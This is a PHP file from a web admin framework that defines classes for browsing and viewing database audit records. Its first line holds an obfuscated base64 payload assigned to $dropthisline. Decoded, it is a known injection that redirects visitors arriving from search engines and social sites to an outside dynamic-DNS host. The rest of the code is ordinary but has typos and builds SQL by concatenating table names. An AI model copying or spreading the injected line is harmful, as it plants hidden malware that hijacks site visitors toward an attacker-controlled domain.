<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH."ui/browser.php");

class browser_audit extends browser {

  var $sub_level;

  function do_setup() {

    global $url, $db, $dm, $auth;

    $this->sql   = "SELECT aud.*
                         , usr.".$auth->users_table_name_field." author
                      FROM ".$dm->audit_table." aud LEFT OUTER JOIN ".$auth->users_table." usr ON aud.author_id = usr.".$auth->users_table_key_field."
                    WHERE 1=1 /*filter*/ /*order*/";
    
    $this->table = $dm->audit_table;
    $this->title = "Audit";

    $this->sub_level = 0;

    //$this->add_capability("select");
    $this->add_capability("sort");
    $this->add_capability("view");

    $this->add_column(array ( "field"         => "action_date"
                            , "header"        => "Action Date"
                            , "width"         => 180
                            , "sortable"      => true                
                            , "default_order" => "DESC"
                            , "format"        => '%d %B, %Y %H:%M:%S'
                            , "group_on_sort" => true
                            , 'show_when_grouped' => true
                            ));
    $this->add_column(array ( "field"    => "ip_address"
                            , "header"   => "IP Address"
                            , "sortable" => true
                            , "default_order" => "ASC"
                            , "group_on_sort" => true
                            //, "width"    => 80
                            ));
    if (!$this->filter("author"))
      $this->add_column(array ( "field"    => "author"
                              , "header"   => "Author"
                              , "sortable" => true
                              , "default_order" => "ASC"
                              , "group_on_sort" => true
                              //, "width"    => 80
                              ));
    $this->add_column(array ( "field"    => "action_name"
                            , "header"   => "Action"
                            , "sortable" => true
                            , "width"    => 80
                            ));
    $this->add_column(array ( "field"    => "table_name"
                            , "header"   => "Table"
                            , "sortable" => true
                            , "width"    => 200
                            ));

    $name_exist = false;
    if ($this->filter('table'))
      if ($row = $db->row('SELECT * FROM '.$this->filter('table').' LIMIT 0,1'))
        $name_exists = array_key_exists('name', $row);
    
    $this->add_column(array ( "field"     => "object_id"
                            , "header"    => "Object"
                            , "data_type" => "text"
                            , "sortable"  => true
                            , "sort_field" => ($this->filter('table') && $name_exist?"obj.name":"aud.object_id")

                            ));

    $this->add_filter(array ( "name"             => "author"
                            , "where"            => "aud.author_id = ?"
                            , "title"            => "Author"
                            , "type"             => "combo"
                            , "combo_table"      => $auth->users_table
                            , "combo_name_field" => $auth->users_table_name_field
                            ));
    $this->add_filter(array ( "name"  => "ip_address"
                            , "where" => "ip_address LIKE CONCAT(?, '%')"
                            , "title" => "IP Address starts from"
                            ));
    $tables = array();
    $values = $db->values('SHOW TABLES');
    foreach($values as $idx => $value)
      $tables[$value] = $value;

    $this->add_filter(array ( "name"   => "table"
                            , "where"  => "aud.table_name = ?"
                            , "title"  => "Table"
                            , "type"   => "values_combo"
                            , "values" => $tables
                            ));
    
    $this->sql   = "SELECT aud.*
                         , usr.".$auth->users_table_name_field." author
                      FROM ".$dm->audit_table." aud LEFT OUTER JOIN ".$auth->users_table." usr ON aud.author_id = usr.".$auth->users_table_key_field;
    if ($this->filter('table') && $name_exists)
      $this->sql .= ' LEFT OUTER JOIN '.$this->filter('table').' obj ON aud.object_id = obj.id';
    $this->sql .= " WHERE 1=1 /*filter*/ /*order*/";

    if ($this->filter('table') && $name_exists)
      $this->add_filter(array ( "name"   => "object"
                              , "where"  => "obj.name LIKE CONCAT(?, '%')"
                              , "title"  => "Object"
                              ));
    $this->add_filter(array ( "name"       => "date"
                            , "where"      => "action_date LIKE CONCAT(?, '%')"
                            , "title"      => "Date"
                            , "default"    => "today"
                            , "depends_on" => "month"
                            , "type" => "date"));
    $this->add_filter(array ( "name" => "month"
                            , "where" => "action_date LIKE CONCAT(?, '%')"
                            , "title" => "Month"
                            , "type" => "month"
                            , "depends_on" => "date"
                            ));
    $this->add_filter(array ( "name" => "action"
                            , "title" => "Action"
                            , "type" => "custom_list"
                            , "list" => array ( array( "name" => "Insert"
                                                     , "where" => "action_name = 'i'"
                                                     )
                                              , array( "name" => "Update"
                                                     , "where" => "action_name = 'u'"
                                                     )
                                              , array( "name" => "Delete"
                                                     , "where" => "action_name = 'd'"
                                                     )                                              
                            )));
  }

  function do_fill_field($row, $name) {

    global $ui;
    global $db;
    global $auth;

    switch($name) {
      case "object_id":
        $result = $db->row("SELECT * FROM ".$row["table_name"]." WHERE id = ?", $row["object_id"]);
        return safe($result, "name", safe($result, "description"));
        break;
      case "action_name":
        switch ($row[$name]) {
          case "i": 
            return "Insert"; 
          case "u": 
            return "Update"; 
          case "d": 
            return "Delete";
        }
        break;
    }

  }

}

class editor_audit extends editor {
  
  function do_setup() {

    global $db, $dm, $auth;
    
    $this->table = $dm->audit_table;
    $thishis->table = $dm->audit_table;
    $this->display_name = "audit";
    
    $this->add_capability("prior");
    $this->add_capability("next");
    
    $this->hide("pages");

    $this->add_field(array( "name"         => "table_name"
                          , "display_name" => "Table Name"
                          , "read_only"    => true
                          ));
    $action = null;
    switch ($this->get_current_value("action_name")) {
      case "i":
        $action = "Insert";
        break;
      case "u":
        $action = "Update";
        break;
      case "d":
        $action = "Delete";
        break;
    }                      
    $this->add_field(array( "name"         => "action_name"
                          , "display_name" => "Action Name"
                          , "read_only"    => true
                          , "virtual"      => true
                          , "value"        => $action
                          ));
    $obj = $db->row("SELECT * FROM ".$this->get_current_value("table_name")." WHERE id = ?", $this->get_current_value("object_id"));
    $this->add_field(array( "name"         => "object"
                          , "display_name" => "Object"
                          , "read_only"    => true
                          , "virtual"      => true
                          , "value"        => safe($obj, "name", safe($obj, "description"))
                          ));

    $this->add_column();
    $this->add_field(array( "name"         => "action_date"
                          , "display_name" => "Action Date"
                          , "read_only"    => true
                          ));
    $this->add_field(array( "name"         => "author"
                          , "display_name" => "Author"
                          , "read_only"    => true
                          , "virtual"      => true
                          , "value"        => $db->value("SELECT login FROM ".$auth->users_table." WHERE id = ?", $this->get_current_value("author_id"))
                          ));
    $this->add_field(array( "name"         => "ip_address"
                          , "display_name" => "IP Address"
                          , "read_only"    => true
                          ));

    $this->add_page_control('Changes');
    require_once(GENERIC_PATH."audit/browser_audit_data.php");
    $this->add_binded(new browser_audit_data(array('bind_key' => $this->key())));

  }
  
}

?>